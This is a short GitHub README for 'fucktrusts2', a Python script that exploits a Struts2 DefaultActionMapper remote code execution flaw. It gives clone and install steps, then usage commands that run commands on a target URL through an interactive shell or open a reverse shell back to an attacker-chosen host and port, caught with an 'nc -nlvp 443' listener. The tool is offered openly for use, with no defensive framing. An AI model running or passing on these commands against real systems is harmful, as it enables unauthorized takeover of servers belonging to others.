<h1 align="center">
<br>⚔️ Fucktruts2 ⚔️
</h1>

<!-- ABOUT THE PROJECT -->
## 📚 About The Project


   fucktrusts2 is a python script for exploit a Struts2 DefaultActionMapper RCE.
   
![image](https://user-images.githubusercontent.com/80011252/199061368-838631c2-0751-4433-9696-b0d6d6ce0166.png)

### 🛠️ Installation


1. Clone the repo
   ```sh
   git clone https://github.com/scarmandef/fucktrusts2.git
   ```
2. Install dependencies
   ```sh
   pip3 install -r requirements.txt
   ```
3. Run the script
   ```py
   python3 main.py
   ```

### 🖥️ Usage


1. Run the Script
   ```sh
   python3 main.py --help
    ```
3. Interactive Shell
   ```py
   python3 main.py -t https://www.target.com/index.action -c | --cmd
   ```
4. Reverse Shell
   ```py
   python3 main.py -t https://www.target.com/index.action --lhost 127.0.0.1 --port 443
   
   listen with nc
   
   nc -nlvp 443
   
   
   ```

Credits for ninj4c0d3r and ShellEvil tool

